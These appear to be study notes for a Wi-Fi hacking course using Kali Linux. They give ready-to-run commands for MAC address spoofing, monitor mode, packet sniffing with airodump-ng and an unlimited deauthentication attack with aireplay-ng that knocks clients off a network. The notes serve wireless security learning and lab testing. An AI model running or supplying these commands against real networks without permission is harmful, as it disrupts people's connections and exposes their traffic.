## Lab setup
* Install kali linux
* Buy an external USB WiFi dongle. Normally internal WiFi adapters do not support monitor mode, packet injections. [Setup USB WiFi adapter on virtual box](https://www.youtube.com/watch?v=RiTICcLH4kU)

## Network hacking basics
### Attack types
  1.	Pre-connection attacks
  2.	Gaining access
  3.	Post-connection attacks

### MAC (Media Access Control) address
#### Features
  * Permanent
  * Unique
  * Physical
  * Assigned by manufacturers
#### Why change MAC address?
  * Increase annonymity
  * Impersonate other devices
  * Bypass filters
#### Change MAC address
Say, we want to change the MAC address of wlan0 interface. wlan0 will be used in further sections as wireless interface name.
```
ifconfig (check present MAC address)
ifconfig wlan0 down (disable interface)
ifconfig wlan0 hw ether 00:11:22:33:44:55 (change)
ifconfig wlan0 up (enable again)
```
Restarting computer will reset the MAC address again.
### Monitor mode
Allows a computer with a wireless network interface controller (WNIC) to monitor all traffic received on a wireless channel.
Only applies to wireless networks. Monitor mode is one of the eight modes that 802.11 wireless cards can operate in: Master 
(acting as an access point), Managed (client, also known as station), Ad hoc, Repeater, Mesh, Wi-Fi Direct, TDLS and Monitor mode.
#### Change to monitor mode
```
iwconfig (check only wireless interfaces)
ifconfig wlan0 down (disable interface)
airmon-ng check kill (kill all associated process; not mandatory)
iwconfig wlan0 mode monitor (change to monitor mode)
ifconfig wlan0 up (enable interface)
```
Alternative method.
```
airmon-ng check kill
arimon-ng start wlan0 (change to monitor mode)
```

## Pre-connection attacks
### Packet sniffing
#### airodump-ng
* Part of aircrack-ng suit
* airodump-ng is a packet sniffer
* Used to capture all packets in range
* Display detailed info about networks around us
#### List networks running airodump-ng
Enable monitor mode and run following.
```
airodump-ng wlan0 (wlan0: monitor interface)
```
#### Related terminologies
* BSSID: MAC address of the target network
* PWR: Signal strength
* Beacons: Packets sent by the network in order to broadcast it's existance
* #Data: Number of data packets collected
* #/s: Number of data packets collected in the past 10 seconds
* CH: Channel number
* MB: Maximum speed supported by the network
* ENC: Encryption type
* CIPHER: Cipher type
* AUTH: Authentication type
* ESSID: Name of the network
### WiFi bands
#### Features
* Decides the frequency range that can be used
* Determines the channels that can be used
* Clients need to support bands to communicate with the router
#### Most common WiFi bands
* a: 5GHz
* b, g: 2.4GHz
* n: 2.4GHz and 5GHz
* ac: lower than 6GHz
#### Listen to specific band
```
airodump-ng --band a wlan0 (bands: a, b, g)
```
For multiple bands: e.g. `--band abg`
### Targeted packet sniffing
```
airodump-ng --bssid [BSSID] --channel [CH] --write [filename] wlan0
```
Files will be created with .csv, .netxml, .cap extensions. Where .cap is capture file. Can be opened with wireshark. .cap file cantains captured packets.
### Deauthentication attack
Disconnect any client from any network.
* Works on encrypted networks (WEP, WPA and WPA2)
* No need to know the network key
* No need to connect to the network
#### Run
```
iwconfig wlan0 channel [CH] (set channel number same as router)
aireplay-ng --deauth [#DeauthPackets] -a [NetworkMAC] -c [TargetMAC] wlan0
```
Where

#DeauthPackets: Number of deauthentication packets. 0 will represent infinite number of deauth attacks.

NetworkMAC: Router MAC address

TargetMAC: Client MAC address









